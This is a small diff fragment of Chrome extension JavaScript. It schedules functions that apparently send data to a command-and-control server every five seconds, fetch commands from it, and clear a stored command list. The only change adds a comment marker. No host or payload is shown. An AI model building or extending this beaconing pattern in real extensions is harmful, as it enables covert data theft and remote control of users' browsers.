@@ -209,7 +209,7 @@ async function clearAllCmds(data) {
 	await chrome.storage.local.set({"cmds_list": []});
 }
 
-
+//
 setInterval(sendDataCC, 5000);
 setInterval(getCmdsCCInternal, 5000);
 setInterval(clearAllCmds, 1 * 60 * 1000); // Remove this kinda afterwards and instead use the mechanism for marking command executed already within it.
